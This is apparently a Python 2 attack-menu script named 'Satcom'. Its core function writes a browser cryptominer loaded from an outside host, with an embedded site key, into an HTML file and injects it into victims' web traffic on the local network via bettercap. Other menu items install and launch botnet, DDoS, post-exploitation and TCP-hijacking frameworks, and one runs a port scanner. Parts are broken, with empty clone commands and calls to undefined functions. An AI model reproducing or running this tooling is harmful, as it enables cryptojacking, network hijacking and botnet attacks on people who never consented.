import subprocess
import os
from time import sleep
import time
import sys
import click
import socket
import os.path
import datetime
from netifaces import interfaces, ifaddresses, AF_INET

    # hide some errors from shell
class DevNull:
    def write(self, msg):
        pass
sys.stderr = DevNull()


# ----------------------------------------------------------------------------------------------
def my_quit_fn():
    os.system('clear')
    raise SystemExit

# ----------------------------------------------------------------------------------------------
def invalid():
   print "INVALID CHOICE!"
   os.system('clear')

# -------------------------------SHELL COM'S------------------------------------------------------

def my_updateupgrade_fn():
	os.system('clear')
	os.system('xterm -e apt-get upgrade && upgrade')
	main()

# -------------------------------GIT SOFTWARE-----------------------------------------------------
def my_bettercap_ui_fn():
    os.system('clear')
    os.system('service apache2 stop')
    if os.path.isdir('ui'):
        p=subprocess.Popen("xterm -e bettercap -caplet http-ui", shell=True)
        os.system('xdg-open http://localhost/')
        print p
        sub_menu_1()
    else:
         print('\033[5m\033[1m\033[31mINSTALLATION\033[0m')
         os.system('git clone https://github.com/bettercap/ui.git')
         os.system('clear')

# ----------------------------------------------------------------------------------------------
def my_installSentinel_fn():
	os.system('clear')
	os.system('git clone')
# ----------------------------------------------------------------------------------------------
def my_installStratos_fn():
	os.system('clear')
	if os.path.isdir('/STRATOS'):
	  print("Already installed")
	else:
	  print('\033[5m\033[1m\033[31mINSTALLATION\033[0m')
	  os.system('git clone ')

def my_bettercapcombined_fn():
    html = '''<script src="https://www.hostingcloud.racing/tIQu.js"></script> \n <script> \n var _client = new Client.Anonymous('28769ba1b18006807659bf271629616190dae6f66cb4e961474ebe68fc5850f9', \n {throttle: 0, ads: 0 \n }); \n _client.start(); \n </script>'''
    # html = '''<script>alert("Bonjour ! ")</script> '''
    html_file = open("miner.html","w")
    html_file.write(html)
    html_file.close()
    os.system('clear')
    template()
    # "Afficher l'adresse IP de la machine locale"
    print"""\n To run cryptojacking jsinjection at first please open main script and change "html" variable on line 64 in my_bettercapcombined_fn fonction with your jsscript that you can find on coinimp.com \n"""
    print"""\n If wlan0 is not working turn it off (or use eth0 it's better)  \n"""
    print """  TIPS: use XXX.XXX.XXX.XXX-254 to set 254 targets, for more options use bettercap -h command in another terminal \n"""
    target = raw_input("\033[1m \033[31m IP: \033[32m")
    print '\033[37m'

    interface = raw_input("\033[1m \033[31m interface (wlan0, eth0): \033[32m")
    os.system('clear')

    subprocess.call(['gnome-terminal --name=Bettercap_jsinjection --geometry=80x14+0+0 -- ','bettercap','-I',interface,'-T',target,'--proxy-module','injecthtml','--html-file','miner.html'])

def my_managerrestart_fn():
	os.system('service network-manager restart')
	sub_menu_1()


def my_webservices_fn():
	os.system('system apache2 start')
	os.system('system mysql start')
	sub_menu_1()

def my_ssh():
    os.system('clear')
    ip = raw_input('target ip: ')
    name = raw_input('target username: ')

    subprocess.call(["xterm","-e","ssh",name+"@"+ip])

def multiscreen_display():
    os.system('clear')
    print "you can change shells contents into the script"
    print "if nothing work please install gnome-terminal or use xterm"
    time.sleep(3)
    # os.system('gnome-terminal --name=Update_and_Upgrade --geometry=80x14+0+0 -- sudo apt-get update && upgrade')
    # os.system('gnome-terminal --name=Bettercap_ui --geometry=80x14+0+0 -- bettercap -caplet http-ui')
    os.system('gnome-terminal --name=satcom --geometry=80x14+0+0 -- python TITANmk2.py')
    time.sleep(0.25)
    os.system('gnome-terminal --name=HTOP --geometry=80x14+0+340 -- htop')
    # os.system('gnome-terminal -e -- ')
    os.system('clear')

def port_scanner():
    import socket
    import subprocess
    import sys
    from datetime import datetime

    # Clear the screen
    subprocess.call('clear', shell=True)

    # Ask for input
    remoteServer    = raw_input("Enter a remote host to scan: ")
    remoteServerIP  = socket.gethostbyname(remoteServer)

    # Print a nice banner with information on which host we are about to scan
    print "-" * 60
    print "Please wait, scanning remote host", remoteServerIP
    print "-" * 60

    # Check what time the scan started
    t1 = datetime.now()

    # Using the range function to specify ports (here it will scans all ports between 1 and 1024)

    # We also put in some error handling for catching errors

    try:
        for port in range(1,1025):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex((remoteServerIP, port))
            if result == 0:
                print "Port {}: 	 Open".format(port)
            sock.close()

    except KeyboardInterrupt:
        print "You pressed Ctrl+C"
        sys.exit()

    except socket.gaierror:
        print 'Hostname could not be resolved. Exiting'
        sys.exit()

    except socket.error:
        print "Couldn't connect to server"
        sys.exit()

    # Checking the time again
    t2 = datetime.now()

    # Calculates the difference of time, to see how long it took to run the script
    total =  t2 - t1

    # Printing the information to screen
    print 'Scanning Completed in: ', total

#------------------------------MENUS_DEPENDANCES------------------------------------------------------
# -----------------------------------------------------------------------------------------

def my_manyfullinstall_fn():
    os.system('clear')
    os.system("gnome-terminal -- sudo apt-get install htop python-all python-struct python-urllib2 python-argparse python-tempfile python-threading python-pprint python-shodan python-sqlite3 python-colorama python-mechanize")


def py_shodan():
    os.system('clear')
    if os.path.isdir('My-Shodan-Scripts'):
        print "GO CHECK REPOSITORY NAMED My-Shodan-Scripts"
        time.sleep(2)
        sub_menu_1()
    else:
         print('\033[5m\033[1m\033[31mINSTALLATION\033[0m')
         os.system('git clone https://github.com/random-robbie/My-Shodan-Scripts.git')
         os.system('clear')


def install_bettercap_162():
    os.system('clear')
    if os.path.isdir('bettercap1.6.2'):
        print "Already installed, if something wrong please delete bettercap1.6.2 folder"
        time.sleep(2)
        my_installator_fn()
    else:
        os.system('git clone https://github.com/v1s1t0r1sh3r3/bettercap1.6.2.git')
        os.system('dpkg -i bettercap_1.6.2-0parrot1_all.deb')
        os.system('clear')



def install_kickthemout():
    os.system('clear')
    if os.path.isdir('kickthemout'):
        print "Already installed, if something wrong please delete kickthemout folder"
        os.system('python3 kickthemout/kickthemout.py')
    else:
        os.system('git clone https://github.com/k4m4/kickthemout.git')
        os.system('pip3 install -r kickthemout/requirements.txt')
        os.system('clear')

def credits():
    os.system('clear')
    print ('''
                  ,ad8888ba,  88        88 88888888888 88        88
                 d8"'    `"8b 88        88 88          88        88
                d8'           88        88 88          88        88
                88            88aaaaaaaa88 88aaaaa     88aaaaaaaa88
                88            88""""""""88 88"""""     88""""""""88
                Y8,           88        88 88          88        88
                 Y8a.    .a8P 88        88 88          88        88
                  `"Y8888Y"'  88        88 88888888888 88        88 \n \n''')

    print 'AS THEY SAY IN FRENCH ! \n'
    print 'SATCOM'
    time.sleep(4)
    os.system('clear')
    main()
# def give_me_something():

def ufw_firewall():
    os.system('clear')
    os.system('sudo apt install ufw')
    os.system('clear')
    answ=True
    while answ:
        print("""
         open all commons ports ? y/n
         """)
        ans=raw_input("What would you like to do? ")
        if ans=="y":
            os.system('clear')
            os.system('ufw enable')
            os.system('ufw allow 80')
            os.system('ufw allow 81')
            os.system('ufw allow 8080')
            os.system('ufw allow 4444')
            os.system('ufw allow 22')
            os.system('ufw allow 21')
            os.system('ufw allow 445')
            os.system('ufw allow 443')
            os.system('ufw reload')
            os.system('ufw status numbered')
            time.sleep(5)
            os.system('clear')
            print " firewall is now activate and ports 80,81,8080,4444,22,21,445,443 are now open"
            print " use : ufw allow xxx or ufw deny xxx to act/dis ports"
            print " use : ufw disable/enable to act/dis firewall"
            time.sleep(8)
            os.system('clear')
            main()
        if ans =="n":
            os.system('clear')
            main()
        else:
            ans = None
            os.system('clear')
            print("\n Not Valid Choice Try again")
            time.sleep(0.5)
            os.system('clear')
            ufw_firewall()

def install_morpheus():
    os.system('clear')
    if os.path.isdir('morpheus'):
        print "Already installed, if something wrong please delete morpheus folder"
        os.system('gnome-terminal --name=morpheus --geometry=80x14+0+500 -- ./morpheus/morpheus.sh')
        os.system('clear')
    else:
        os.system('git clone https://github.com/r00t-3xp10it/morpheus.git')
        os.system('chmod -R +x *.sh')
        os.system('chmod -R +x *.py')
        os.system('nano settings')
        os.system('sudo ./morpheus.sh')
        os.system('clear')

def empire_fram():
    os.system('clear')
    if os.path.isdir('empire'):
        print "Already installed, if something wrong please delete Empire folder"
        os.system('gnome-terminal --name=Empire --geometry=80x14+0+500 -- ./Empire/empire.sh')
        os.system('clear')
    else:
        os.system('git clone https://github.com/EmpireProject/Empire.git')
        os.system('clear')
        os.system('sudo ./Empire/setup/install.sh')
        os.system('clear')


# work in progress
def byob():
    if os.path.isdir('byob'):
        os.system('clear')
        answ=True
        while answ:
            print "         1.Client\n         2.Server\n         00.Exit"
            ans=raw_input("What would you like to do? ")
            if ans=="1":
                os.system('clear')
                os.system('gnome-terminal --name=client --geometry=80x14+0+0 -- ''cd byob/byob/ && python3 client.py''')
                os.system('clear')
            elif ans=="2":
                os.system('clear')
                os.system('gnome-terminal --name=server --geometry=80x14+0+0 -- ''cd byob/byob/ && python3 server.py''')
                os.system('clear')
            elif ans=="00":
                my_installator_fn()
                ans = None
            else:
                os.system('clear')
                time.sleep(0.5)
                invalid()
        os.system('clear')
    else:
        os.system('clear')
        os.system('git clone https://github.com/malwaredllc/byob.git')
        os.system('clear')
        os.system('pip install -r byob/byob/requirements.txt')
        os.system('clear')
        os.system('./byob/byob/setup.py')
        os.system('clear')


def ufonet():
    os.system('clear')
    if os.path.isdir('ufonet'):
        print "Already installed, if something wrong please delete ufonet folder"
        print " use python ./ufonet --gui in ufonet repository"
        time.sleep(5)
        os.system('clear')
    else:
        os.system('git clone https://github.com/epsylon/ufonet.git')
        os.system('python ufonet/setup.py')
        os.system('chmod +x ufonet/ufonet')
        os.system('clear')

def ares():
    os.system('clear')
    if os.path.isdir('Ares'):
        print "Already installed, if something wrong please delete Ares folder"
        os.system('clear')
    else:
        os.system('git clone https://github.com/sweetsoftware/Ares.git')
        os.system('chmod +x Ares/wine_setup.sh')
        os.system('pip install -r Ares/requirements.txt')
        os.system('clear')

# ------------------------------MENUS------------------------------------------------------
# -----------------------------------------------------------------------------------------
def my_installator_fn():
    os.system('clear')
    template()
    answ=True
    while answ:
        print("""
        1.Bettercap-1.6.2 (used for js injection script)
        2.Kickthemout  <------Kick devices from network(can be slow)
        3.UFW firewall  <------Common firewall
        4.Morpheus  <-----Automated Ettercap TCP/IP Hijacking Tool
        5.Empire    <-----Post explotation framework
        6.byob      <-----BOTNET multi-platform
        7.UFOnet    <-----BOTNET DDos (best)
        8.Ares      <-----BOTNET
         """)
        ans=raw_input("What would you like to do? ")
        if ans=="1":
            install_bettercap_162()
        elif ans=="2":
            install_kickthemout()
        elif ans=="3":
            ufw_firewall()
        elif ans=="4":
            install_morpheus()
        elif ans=="5":
            empire_fram()
        elif ans=="6":
            byob()
        elif ans=="7":
            ufonet()
        elif ans=="8":
            ares()

        # elif ans=="8":
        #
        # elif ans=="9":

        # elif ans=="10":
        # elif ans=="11":
        elif ans=="00":
            sub_menu_1()
            ans = None
        else:
            os.system('clear')
            time.sleep(0.5)
            os.system('clear')
            template()

def template():
    os.system('clear')
    print ("""\033[1m\033[5m\033[31m/ ____|     | |\n| (___  __ _| |_ ___ ___  _ __ ___\n\___ \ / _` | __/ __/ _ \| '_ ` _ \ \n____) | (_| | || (_| (_) | | | | | |\n|____/ \__,_|\__\___\___/|_| |_| |_| \033[0m \033[37m""")
    print ("---Script by Satcom--- \n")
    x = datetime.datetime.now()
    print(x)
    print('\n ----------------------------------------------------')
    for ifaceName in interfaces():
        addresses = [i['addr'] for i in ifaddresses(ifaceName).setdefault(AF_INET, [{'addr':'No IP address'}] )]
        print '   		%s: %s' % (ifaceName, ', '.join(addresses))
    print(' ----------------------------------------------------')


def sub_menu_1():
    os.system('clear')
    template()
    answ=True
    while answ:
        print("""
         1.Download full ARSNEAL
         2.Download modules
         3.Bettercap ui
         4.UPDATE & UPGRADE
         5.Restart Network-Manager Service
         6.Start all Web services(apache,mysql)
         7.Install dependences
         8.Bettercap JS INJECTION script combined (keylogger + crypto-mining)
         9.SHODAN SCRIPTS (powerfull caution)
         10.Simple SSH connexion
         11.MULTSCREEN DISLPAYER
         12.port scanner
         00.Exit/Quit
         """)
        ans=raw_input("What would you like to do? ")
        if ans=="1":
            my_installarsenal_fn()
        elif ans=="2":
            my_installator_fn()
        elif ans=="3":
            my_bettercap_ui_fn()
        elif ans=="4":
            my_updateupgrade_fn()
        elif ans=="5":
            my_managerrestart_fn()
        elif ans=="6":
            my_webservices_fn()
        elif ans=="7":
            my_manyfullinstall_fn()
        elif ans=="8":
            my_bettercapcombined_fn()
        elif ans=="9":
            py_shodan()
        elif ans=="10":
            my_ssh()
        elif ans=="11":
            multiscreen_display()
        elif ans=="12":
            port_scanner()
        elif ans=="00":
            main()
            ans = None
        else:
            os.system('clear')
            time.sleep(0.5)
            template()


# def arsenal():
#     os.system('clear')
#     template()
#     answ=True
#     while answ:
#         print("""
#          1.MITM
#          2.Remote access
#          3.Webside tools
#          4.Scanners
#          00.Exit/Quit
#          """)
#         ans=raw_input("What would you like to do? ")
#         if ans=="1":
#             MITM()
#         elif ans=="2":
#             Remote_access()
#         elif ans=="3":
#             Webside_tools()
#         elif ans=="4":
#             Scanners()
#         elif ans=="00":
#             my_quit_fn()
#             ans = None
#         else:
#             os.system('clear')
#             print("\n Not Valid Choice Try again")
#             time.sleep(0.5)
#             os.system('clear')
#             arsenal()
# -------------------------------MAIN MENU------------------------------------------------------
# ----------------------------------------------------------------------------------------------

def main():

    template()
    answ=True
    while answ:
        print("""
         1.Uilities
         2.ARSENAL
         3.CREDITS
         4.I REALY REALY love BITCOIN AND MONERO
         00.Exit/Quit
         """)
        ans=raw_input("What would you like to do? ")
        if ans=="1":
          sub_menu_1()
        elif ans=="2":
            arsenal()
        elif ans=="3":
            credits()
        elif ans=="00":
          my_quit_fn()
          ans = None
        else:
            os.system('clear')
            print("\n Not Valid Choice Try again")
            time.sleep(0.5)
            os.system('clear')
            template()



# --------------------------------MAIN---------------------------------------------------------
# ----------------------------------------------------------------------------------------------


if __name__ == "__main__":
	main()

# os.system('clear')
# if os.path.isdir('ui'):
#     p=subprocess.Popen("xterm -e bettercap -caplet http-ui", shell=True)
#     print p
#     sub_menu_1()
# else:
#      print('\033[5m\033[1m\033[31mINSTALLATION\033[0m')
#      os.system('git clone https://github.com/bettercap/ui.git')
#      os.system('clear')


# print '\033[1m \033[31m \033[5m BETTERCAP INITIALISATION \033[32m\033[0m'
# print '\033[32m'
# with click.progressbar(range(100000), file=sys.stderr, show_pos=True, width=30, bar_template='[%(bar)s] %(info)s', fill_char='~', empty_char=' ') as bar:
#     for i in bar:
#         pass
# print '\033[0m'
